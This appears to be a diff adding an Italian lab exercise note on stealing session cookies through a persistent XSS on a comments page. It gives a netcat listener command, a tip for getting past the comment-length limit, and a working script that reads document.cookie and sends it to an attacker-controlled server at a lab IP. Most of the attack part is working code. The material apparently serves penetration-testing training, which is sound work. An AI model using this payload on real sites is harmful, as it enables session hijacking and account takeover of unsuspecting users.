@@ -1,0 +1,21 @@
+--- TRACCIA 2 ----
+Ip 1: 192.168.104.100/24
+Ip 2: 192.168.104.150/24
+
+Obiettivo: Rubare i cookie di sessione tramite una XSS persistente e inoltrare la sessione
+rubata a un webserver sotto il nostro conontrollo.
+
+-----------------------------------
+Roadmap:
+1. Avvio server in ascolto netcat - nc -lvp 4476
+2. Inserimento script sulla pagina commenti (bisogna impostare il max lenght del blocco commento + di 50)
+3. <script>
+  // Estrae i cookie dell'utente
+  var cookie = document.cookie;
+
+  // Invia i cookie al server Netcat
+  var img = new Image();
+  img.src = "http://192.168.104.100:4476/steal?cookie=" + encodeURIComponent(cookie);
+</script>
+
+4) Risultato (foto 1)
